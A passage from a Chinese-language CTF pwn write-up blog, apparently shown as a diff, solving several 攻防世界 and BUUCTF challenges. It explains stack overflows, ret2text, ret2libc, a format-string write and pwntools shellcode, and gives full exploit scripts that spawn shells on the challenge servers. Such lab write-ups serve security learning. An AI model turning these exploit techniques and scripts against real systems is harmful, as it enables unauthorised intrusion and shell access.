class="hljs-comment">//ret2txt，题目中设置了后门函数可以直接cat flag</span><br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+<p>在这道题中，由于payload较长，我们正常写payload可能会写成这样。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">payload = <span class="hljs-string">b&#x27;a&#x27;</span> * (<span class="hljs-number">0x14</span> + <span class="hljs-number">4</span>) + p32(success_plt) + <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">232</span> <br></code></pre></td></tr></table></figure>
+<p>如果利用上flat来去掉一些难看的结构，我们可能会写成这样。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">payload = flat([a * (<span class="hljs-number">0x14</span> + <span class="hljs-number">4</span>), success_plt, <span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">232</span>])<br></code></pre></td></tr></table></figure>
+<p>但是这还是非常麻烦，特别是我们要手动算出最后要添加多少个a，来到达260的长度。</p>
+<p>所以我现在利用flat函数的高阶用法，利用一个字典来指定第几位是什么值，其他的值就会自动补为a。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">payload = flat([<span class="hljs-number">0x14</span> + <span class="hljs-number">4</span>: success_plt, <span class="hljs-number">260</span>: <span class="hljs-string">&#x27;1&#x27;</span>])<br></code></pre></td></tr></table></figure>
+<div class='spoiler collapsed'>
+    <div class='spoiler-title'>
+        最终payload代码
+    </div>
+    <div class='spoiler-content'>
+        <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment"># sh = process(&quot;./int_overflow&quot;)</span><br>sh = remote(<span class="hljs-string">&quot;111.200.241.244&quot;</span>, <span class="hljs-number">63700</span>)<br>success_plt = <span class="hljs-number">0x0804868B</span><br>sh.sendlineafter(<span class="hljs-string">&quot;choice:&quot;</span>, <span class="hljs-string">&quot;1&quot;</span>) <span class="hljs-comment">#1号选项</span><br>sh.sendlineafter(<span class="hljs-string">&quot;username:\n&quot;</span>, <span class="hljs-string">&quot;wuuconix&quot;</span>) <span class="hljs-comment">#username</span><br>sh.recvuntil(<span class="hljs-string">&quot;passwd:\n&quot;</span>) <span class="hljs-comment">#到达漏洞点</span><br>payload = flat(&#123; <span class="hljs-number">0x14</span> + <span class="hljs-number">4</span> : success_plt, <span class="hljs-number">260</span>: <span class="hljs-string">&#x27;1&#x27;</span>&#125;)<br>sh.sendline(payload)<br>sh.interactive()<br></code></pre></td></tr></table></figure>
+
+    </div>
+</div>
+<h3 id="8cgpwn2"><a class="markdownIt-Anchor" href="#8cgpwn2"></a> 8.cgpwn2</h3>
+<p>本题应该属于基本ROP中的ret2libc。没有现成的后门函数，比如<code>system('/bin/sh')</code>或者<code>system('cat flag')</code>之类的。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">int</span> pwn()<br>&#123;<br>  <span class="hljs-keyword">return</span> system(<span class="hljs-string">&quot;echo hehehe&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure>
+<p>但是这个后门函数中有system，我们再找到一个/bin/sh字符串就能够去手动调用了。可惜shift+F12，没有找到这个字符串。</p>
+<p>我们观察可执行文件的运行流程，它会让我们输入姓名和一条信息，在信息那块有gets造成的栈溢出，而姓名那块我们则可以输入一个/bin/sh来手动把name变成我们需要的字符串。</p>
+<p><img src="https://upyun.wuuconix.link/image-20220202140445981.png" srcset="/img/loading.gif" lazyload alt="可执行文件运行流程" /></p>
+<div class='spoiler collapsed'>
+    <div class='spoiler-title'>
+        payload代码
+    </div>
+    <div class='spoiler-content'>
+        <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment"># sh = process(&quot;./cgpwn2&quot;)</span><br>sh = remote(<span class="hljs-string">&quot;111.200.241.244&quot;</span>, <span class="hljs-number">62148</span>)<br>sh.sendlineafter(<span class="hljs-string">&quot;name\n&quot;</span>, <span class="hljs-string">&quot;/bin/sh&quot;</span>) <span class="hljs-comment">#构造/bin/sh字符串</span><br>sh.recvuntil(<span class="hljs-string">&quot;here:\n&quot;</span>) <span class="hljs-comment">#到达栈溢出漏洞点</span><br>sys_plt = <span class="hljs-number">0x08048420</span><br>bin_sh_addr = <span class="hljs-number">0x0804A080</span> <span class="hljs-comment">#即name变量</span><br>payload = flat(&#123;<span class="hljs-number">0x26</span> + <span class="hljs-number">4</span>: [sys_plt, <span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">4</span>, bin_sh_addr]&#125;)<br>sh.sendline(payload)<br>sh.interactive()<br></code></pre></td></tr></table></figure>
+
+    </div>
+</div>
+<h3 id="9string"><a class="markdownIt-Anchor" href="#9string"></a> 9.string</h3>
+<p>这道题的流程相比之前所有的题目都要复杂。但是考点实际上只有两个，一个是格式化字符串漏洞，一个是shellcode的构建。</p>
+<p>以下是这道题的主要流程</p>
+<pre><code class=" mermaid">graph TD
+
+main[&quot;主函数main&lt;br&gt;包含sub_400996&lt;br&gt;和sub_400D72&lt;br&gt;开局输出了两个secret地址&lt;br&gt;为之后的fmtstr利用&quot;]
+sub_400996[&quot;sub_400996&lt;br&gt;输出welcom信息&quot;]
+sub_400D72[&quot;sub_400D72(a1)&lt;br&gt;输入角色名&lt;br&gt;包含sub_400A7D&lt;br&gt;sub_400BB9&lt;br&gt;sub_400CA6(a1)&quot;]
+sub_400A7D[&quot;sub_400A7D&lt;br&gt;选择east or up&lt;br&gt;必须选择east&quot;]
+sub_400BB9[&quot;sub_400BB9&lt;br&gt;选择1还是0&lt;br&gt;必须选择1&lt;br&gt;然后提示输入一个地址&lt;br&gt;我们应该输入主函数中提示的secret地址&lt;br&gt;利用格式化字符串漏洞&lt;br&gt;将secret[0]变为85&quot;]
+sub_400CA6[&quot;sub_400CA6(a1)&lt;br&gt;在成功利用格式化字符串漏洞后&lt;br&gt;输入shellcode执行&quot;]
+main--&gt;sub_400996--&gt;sub_400D72
+sub_400A7D--&gt;sub_400BB9--&gt;sub_400CA6
+</code></pre>
+<p>以下为程序中的关键代码</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//sub_400BB9 函数</span><br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;A voice heard in your mind&quot;</span>);<br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;&#x27;Give me an address&#x27;&quot;</span>);<br>_isoc99_scanf(<span class="hljs-string">&quot;%ld&quot;</span>, &amp;v2); <span class="hljs-comment">//输入地址</span><br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;And, you wish is:&quot;</span>);<br>_isoc99_scanf(<span class="hljs-string">&quot;%s&quot;</span>, format); <span class="hljs-comment">//输入格式化字符串</span><br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Your wish is&quot;</span>);<br><span class="hljs-built_in">printf</span>(format);<br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;I hear it, I hear it....&quot;</span>);<br></code></pre></td></tr></table></figure>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//main函数</span><br><span class="hljs-keyword">if</span> ( *a1 == a1[<span class="hljs-number">1</span>] ) <span class="hljs-comment">//需要利用sub_400BB9函数中的格式化字符串漏洞修改变量的值进入if循环</span><br>&#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Wizard: I will help you! USE YOU SPELL&quot;</span>);<br>    v1 = mmap(<span class="hljs-number">0LL</span>, <span class="hljs-number">0x1000</span>uLL, <span class="hljs-number">7</span>, <span class="hljs-number">33</span>, <span class="hljs-number">-1</span>, <span class="hljs-number">0LL</span>); <span class="hljs-comment">//</span><br>    read(<span class="hljs-number">0</span>, v1, <span class="hljs-number">0x100</span>uLL); <span class="hljs-comment">//需要输入生成的shellcode</span><br>    ((<span class="hljs-type">void</span> (__fastcall *)(_QWORD))v1)(<span class="hljs-number">0LL</span>); <span class="hljs-comment">//程序会运行我们输入shellcode</span><br>&#125;<br></code></pre></td></tr></table></figure>
+<p>我在花了很久终于整理出流程并且有了解体思路后，由于我对格式化字符串漏洞不太熟练，之前做 <a href="https://wuuconix.link/2022/01/30/pwn/#1cgfsb">cgfsb</a>的时候只是用了pwntools中的fmtstr_payload，没有了解具体payload的实现原理，这里便一直无法突破第一关。</p>
+<figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs diff"><span class="hljs-deletion">-0000000000000078 var_78          dq ?</span><br><span class="hljs-deletion">-0000000000000070 format          db ?</span><br></code></pre></td></tr></table></figure>
+<p>这是格式化字符串漏洞那个子函数里栈的情况，format是格式化字符串，var_78则是我们输入的地址。</p>
+<p>根据 <a target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/user-mode/fmtstr/fmtstr-intro/#_6">原理介绍 - CTF Wiki (ctf-wiki.org)</a> 对格式化字符串原理的介绍，当格式化字符串中使用了 %d, %s之类的标记，但是没有指定参数，那么就会从format变量栈上面的变量中取值。所以相当于<code>var_78</code>已经指明了地址，现在我们的目标是将这个地址里的值变为85，我们可以使用以下payload。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">payload = <span class="hljs-string">b&#x27;%85c%7$hhn&#x27;</span><br></code></pre></td></tr></table></figure>
+<p>首先这里我们主要利用的%标记是%n，它的功能是将之前输出的字符个数的值存放到对应的地址中，在这里，就会存放到<code>var_78</code>中，因为没有指定参数。</p>
+<p>而这个payload中没有使用<code>n</code>而是使用了<code>hhd</code>，它们的区别是写的内存地址的长度，若是<code>%n</code>，则是向4个字节的内存地址写数据，<code>%hn</code>则是2个字节，<code>%hhn</code>则会是1个字节。因为这道题里我们需要改变的两个变量占的空间是8位，即1个字节，故我们这里使用<code>%hhn</code>。</p>
+<p>那为什么<code>%hhn</code>中间有<code>7$</code>，这个有点难以解释，我们可以暂且记为偏移量减去1。</p>
+<p><img src="https://upyun.wuuconix.link/image-20220203151241758.png" srcset="/img/loading.gif" lazyload alt="偏移量是8" /></p>
+<p>然后<code>%85c</code>用来快速生成85个字符，从而得到85这个数字存往<code>var_78</code>中，通过第一关。</p>
+<p>然后我们可以利用以下代码生成shellcode</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">context(arch = <span class="hljs-string">&quot;amd64&quot;</span>) <span class="hljs-comment">#因为这里用了asm构造的shellcode，必须指明架构。架构用checksec可以看</span><br>payload = asm(shellcraft.sh())<br></code></pre></td></tr></table></figure>
+<div class='spoiler collapsed'>
+    <div class='spoiler-title'>
+        payload代码
+    </div>
+    <div class='spoiler-content'>
+        <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context(arch = <span class="hljs-string">&quot;amd64&quot;</span>) <span class="hljs-comment">#因为这里用了asm构造的shellcode，必须指明架构。架构用checksec可以看</span><br><span class="hljs-comment"># sh = process(&quot;./string&quot;)</span><br>sh = remote(<span class="hljs-string">&quot;111.200.241.244&quot;</span>, <span class="hljs-number">58683</span>)<br>secret0 = sh.recvline_startswith(<span class="hljs-string">&quot;secret[0]&quot;</span>).decode(<span class="hljs-string">&quot;utf-8&quot;</span>).split(<span class="hljs-string">&quot; &quot;</span>)[-<span class="hljs-number">1</span>]<br>sh.sendlineafter(<span class="hljs-string">&quot;character&#x27;s name be:&quot;</span>, <span class="hljs-string">&quot;wuuconix&quot;</span>) <span class="hljs-comment">#随便输入一个name</span><br>sh.sendlineafter(<span class="hljs-string">&quot;east or up?:&quot;</span>, <span class="hljs-string">&quot;east&quot;</span>) <span class="hljs-comment">#选择east</span><br>sh.sendlineafter(<span class="hljs-string">&quot;leave(0)?:&quot;</span>, <span class="hljs-string">&quot;1&quot;</span>) <span class="hljs-comment">#选择there(1)</span><br>sh.sendlineafter(<span class="hljs-string">&quot;an address&#x27;&quot;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-built_in">int</span>(secret0, <span class="hljs-number">16</span>))) <span class="hljs-comment">#输入secret0的地址</span><br><span class="hljs-comment"># payload1 = fmtstr_payload(7, &#123;int(secret0, 16): 85&#125;, write_size=&#x27;byte&#x27;) #错误的做法</span><br>payload1 = <span class="hljs-string">b&#x27;%85c%7$hhn&#x27;</span><br>sh.sendlineafter(<span class="hljs-string">&quot;you wish is:&quot;</span>, payload1) <span class="hljs-comment">#利用格式化字符串漏洞</span><br>将v3(a1)变为<span class="hljs-number">85</span>，和v4(a1 + <span class="hljs-number">1</span>)一样<br>payload2 = asm(shellcraft.sh())<br>sh.sendlineafter(<span class="hljs-string">&quot;USE YOU SPELL&quot;</span>, payload2)<br>sh.interactive()<br></code></pre></td></tr></table></figure>
+
+    </div>
+</div>
+<h3 id="10level3"><a class="markdownIt-Anchor" href="#10level3"></a> 10.level3</h3>
+<p>攻防世界的最后一题啦！题目的流程很简单，就是一个输入，然后就没了，相比第九题string简单许多。</p>
+<p>它的考点是ret2libc，利用libc来得到system函数的真实地址和/bin/sh的真实地址，然后调用获得shell。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">ssize_t</span> <span class="hljs-title function_">vulnerable_function</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">char</span> buf[<span class="hljs-number">136</span>]; <span class="hljs-comment">// [esp+0h] [ebp-88h] BYREF</span><br><br>  write(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;Input:\n&quot;</span>, <span class="hljs-number">7u</span>);<br>  <span class="hljs-keyword">return</span> read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">0x100</span>u); <span class="hljs-comment">//读取大于0x88的数据，造成栈溢出漏洞</span><br>&#125;<br></code></pre></td></tr></table></figure>
+<p>当我们在用C语言编程时，我们都会大量应用库函数，比如printf和scanf等，这些函数都是存在在动态链接库中的。</p>
+<p>理论上我们可以使用动态链接库中的任意函数，但是这些函数在内存中的地址在程序运行的一开始是不知道的，这是为了提升效率，只有当真正去调用它的时候，才会进行绑定，这也叫做叫延迟绑定<code>lazy bind</code>。然后这个绑定后的真实地址会被存在GOT表中。</p>
+<p>在这道题中，题目的附件里给了一个libc文件 <code>libc_32.so.6</code>。它实际上不神秘，它本质上也是一个ELF文件，也能用checksec查看保护情况。</p>
+<p><img src="https://upyun.wuuconix.link/image-20220203194259889.png" srcset="/img/loading.gif" lazyload alt="libc_32.so.6 checksec" /></p>
+<p>它也能用IDA打开，只不过它的函数特别特别多，我们可以在函数列表用<code>ctrl + F</code>来搜索我们想要查看的函数。</p>
+<p><img src="https://upyun.wuuconix.link/image-20220203194842457.png" srcset="/img/loading.gif" lazyload alt="system 地址0x3A940" /></p>
+<p>可以用shift + F12搜索我们想要的字符串。</p>
+<p><img src="https://upyun.wuuconix.link/image-20220203194641077.png" srcset="/img/loading.gif" lazyload alt="/bin/sh 地址0x15902B" /></p>
+<p>两个都有，但是它们在IDA里看到的地址并不是程序运行中实际上的地址。</p>
+<p>我也不知道在IDA里可以看到的地址应该被称为什么，暂且叫为<strong>形式地址</strong>。</p>
+<p>这里有一个重要的关系，两个东西的<strong>形式地址</strong>的差和两个东西的<strong>真实地址</strong>的差是相同的。</p>
+<p>因为所有的形式地址我们都是已知的，也就是只要知道了一个东西的真实地址，我们就可以求出其他任何东西的真实地址。</p>
+<p>在这道题中的ELF文件中，有<code>write</code>函数，我们可以利用write函数打印的功能，把自己got表中的内容打印出来从而获得write函数在本次运行中在内存中的真实地址。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">payload1 = flat(&#123;(<span class="hljs-number">0x88</span> + <span class="hljs-number">4</span>) : [level3.plt[<span class="hljs-string">&#x27;write&#x27;</span>], level3.symbols[<span class="hljs-string">&#x27;main&#x27;</span>], <span class="hljs-number">1</span>, level3.got[<span class="hljs-string">&#x27;write&#x27;</span>], <span class="hljs-number">10</span>]&#125;)<br></code></pre></td></tr></table></figure>
+<p>我们首先用plt直接调用write函数，然后之后的参数分别是 返回地址【这里设置为了main，让程序回到开始】，然后是write的三个参数，第一个参数1表示文件句柄，当1是应该会输出到终端，第二个参数就是我们想要输出的东西，第三个参数是输出的最大长度。</p>
+<p>然后我们利用截取前4个字节，用u32，反打包为一个值。【u可以理解为unpack, p则是pack】</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">write_addr = u32(sh.recv()[:<span class="hljs-number">4</span>])<br></code></pre></td></tr></table></figure>
+<p>这样我们就获得了write函数的真实地址，从而我们可以获得system和/bin/sh的真实地址。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">sys_addr = write_addr + (libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>] - libc.symbols[<span class="hljs-string">&#x27;write&#x27;</span>])<br>bin_sh_addr = write_addr + (<span class="hljs-number">0x0015902b</span> - libc.symbols[<span class="hljs-string">&#x27;write&#x27;</span>])<br></code></pre></td></tr></table></figure>
+<p>最后调用一波即可。</p>
+<div class='spoiler collapsed'>
+    <div class='spoiler-title'>
+        最终payload代码
+    </div>
+    <div class='spoiler-content'>
+        <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context(log_level = <span class="hljs-string">&quot;debug&quot;</span>)<br><span class="hljs-comment"># sh = process(&quot;./level3&quot;)</span><br>sh = remote(<span class="hljs-string">&quot;111.200.241.244&quot;</span>, <span class="hljs-number">63495</span>)<br>level3 = ELF(<span class="hljs-string">&quot;./level3&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;./libc_32.so.6&quot;</span>)<br>payload1 = flat(&#123;(<span class="hljs-number">0x88</span> + <span class="hljs-number">4</span>) : [level3.plt[<span class="hljs-string">&#x27;write&#x27;</span>], level3.symbols[<span class="hljs-string">&#x27;main&#x27;</span>], <span class="hljs-number">1</span>, level3.got[<span class="hljs-string">&#x27;write&#x27;</span>], <span class="hljs-number">10</span>]&#125;) <span class="hljs-comment">#利用栈溢出获得存放在got表中的write函数的真实地址</span><br>sh.sendlineafter(<span class="hljs-string">&quot;Input:\n&quot;</span>, payload1)<br><br>write_addr = u32(sh.recv()[:<span class="hljs-number">4</span>]) <span class="hljs-comment">#write函数在level3这个elf中的真实地址</span><br>sys_addr = write_addr + (libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>] - libc.symbols[<span class="hljs-string">&#x27;write&#x27;</span>])<br>bin_sh_addr = write_addr + (<span class="hljs-number">0x0015902b</span> - libc.symbols[<span class="hljs-string">&#x27;write&#x27;</span>])<br>payload2 = flat(&#123;(<span class="hljs-number">0x88</span> + <span class="hljs-number">4</span>) : [sys_addr, <span class="hljs-number">0</span>, bin_sh_addr]&#125;)<br>sh.sendlineafter(<span class="hljs-string">&quot;Input:\n&quot;</span>, payload2)<br>sh.interactive()<br></code></pre></td></tr></table></figure>
+
+    </div>
+</div>
+<h2 id="buuctf"><a class="markdownIt-Anchor" href="#buuctf"></a> BUUCTF</h2>
+<h3 id="1test_your_nc"><a class="markdownIt-Anchor" href="#1test_your_nc"></a> 1.test_your_nc</h3>
+<p>题如其名，nc后直接获得shell。</p>
+<h3 id="2rip"><a class="markdownIt-Anchor" href="#2rip"></a> 2.rip</h3>
+<p>这道题玄学的很，初学建议跳过这题。</p>
+<p>考点就是ret2text，gets栈溢出+现成的后门漏洞直接get shell。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  <span class="hljs-type">char</span> s[<span class="hljs-number">15</span>]; <span class="hljs-comment">// [rsp+1h] [rbp-Fh] BYREF</span><br><br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;please input&quot;</span>);<br>  gets(s, argv); <span class="hljs-comment">//栈溢出漏洞</span><br>  <span class="hljs-built_in">puts</span>(s);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;ok,bye!!!&quot;</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">fun</span><span class="hljs-params">()</span> <span class="hljs-comment">//现成后门函数</span><br>&#123;<br>  <span class="hljs-keyword">return</span> system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure>
+<div class='spoiler collapsed'>
+    <div class='spoiler-title'>
+        payload代码
+    </div>
+    <div class='spoiler-content'>
+        <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>sh = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>, <span class="hljs-number">26953</span>)<br>fun_addr = <span class="hljs-number">0x401186</span><br>payload = flat(&#123;<span class="hljs-number">0xF</span> + <span class="hljs-number">8</span>: p64(fun_addr + <span class="hljs-number">1</span>)&#125;) //这道题里必须加p64 平常的题目是不需要加的，地址还要加<span class="hljs-number">1</span> 别人说是栈平衡的原因 不太懂<br>sh.sendline(payload)<br>sh.interactive()<br></code></pre></td></tr></table></figure>
+
+    </div>
+</div>
+<h3 id="3warmup_csaw_2016"><a class="markdownIt-Anchor" href="#3warmup_csaw_2016"></a> 3.warmup_csaw_2016</h3>
+<p>发现BUUCTF的题里用flat函数构造payload的时候，具体的函数地址都需要封装，比如 <code>flat(&#123;10: p64(sys_addr)&#125;)</code>，而在攻防世界里不封装也没问题，挺奇怪的。以后为了保险都写上封装函数吧！</p>
+<p>这道题也是最简单的ret2text。不多说。</p>
+<div class='spoiler collapsed'>
+    <div class='spoiler-title'>
+        payload代码
+    </div>
+    <div class='spoiler-content'>
+        <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>sh = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>, <span class="hljs-number">28253</span>)<br>flag_addr = <span class="hljs-number">0x40060D</span><br>payload = flat(&#123; <span class="hljs-number">0x40</span> + <span class="hljs-number">8</span> : p64(flag_addr)&#125;)<br>sh.sendline(payload)<br>sh.interactive()<br></code></pre></td></tr></table></figure>
+
+    </div>
+</div>
+<h3 id="4ciscn_2019_n_1"><a class="markdownIt-Anchor" href="#4ciscn_2019_n_1"></a> 4.ciscn_2019_n_1</h3>
+<p>还是ret2text。这道题的逻辑是通过gets造成的栈溢出修改一个变量的值，从而顺着程序流程获得flag。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">func</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">char</span> v1[<span class="hljs-number">44</span>]; <span class="hljs-comment">// [rsp+0h] [rbp-30h] BYREF</span><br>  <span class="hljs-type">float</span> v2; <span class="hljs-comment">// [rsp+2Ch] [rbp-4h]</span><br><br>  v2 = <span class="hljs-number">0.0</span>;<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Let&#x27;s guess the number.&quot;</span>);<br>  gets(v1); <span class="hljs-comment">//栈溢出漏洞</span><br>  <span class="hljs-keyword">if</span> ( v2 == <span class="hljs-number">11.28125</span> )<br>    <span class="hljs-keyword">return</span> system(<span class="hljs-string">&quot;cat /flag&quot;</span>);<br>  <span class="hljs-keyword">else</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Its value should be 11.28125&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure>
+<p>下面是栈情况</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">-<span class="hljs-number">0000000000000030</span> var_30          db <span class="hljs-number">44</span> dup(?) <span class="hljs-regexp">//</span>v1<br>-<span class="hljs-number">0000000000000004</span> var_4           dd ? <span class="hljs-regexp">//</span>v2<br></code></pre></td></tr></table></figure>
+<p>我们需要将var_4里的值变成11.28125。然而我们不知道浮点数在计算机内部是如何表示的。</p>
+<p>这时候我们可以在IDA View-A里按空格查看汇编代码。找到汇编里代码里的浮点数表示。</p>
+<p><img src="https://upyun.wuuconix.link/image-20220209143749583.png" srcset="/img/loading.gif" lazyload alt="41348000h" /></p>
+<div class='spoiler collapsed'>
+    <div class='spoiler-title'>
+        payload代码
+    </div>
+    <div class='spoiler-content'>
+        <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>sh = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="hljs-number">26874</span>)<br>float_addr = <span class="hljs-number">0x41348000</span><br>payload = flat(&#123;<span class="hljs-number">0x30</span> - <span class="hljs-number">4</span> : float_addr&#125;)<br>sh.sendline(payload)<br>sh.interactive()<br></code></pre></td></tr></table></figure>
+
+    </div>
+</div>
+<h3 id="5pwn1_sctf_2016"><a class="markdownIt-Anchor" href="#5pwn1_sctf_2016"></a> 5.pwn1_sctf_2016</h3>
+<p>还是ret2text。这道题与众不同的是，它是用c++写的，还用了string这个类，反汇编出来的代码十分反人类。</p>
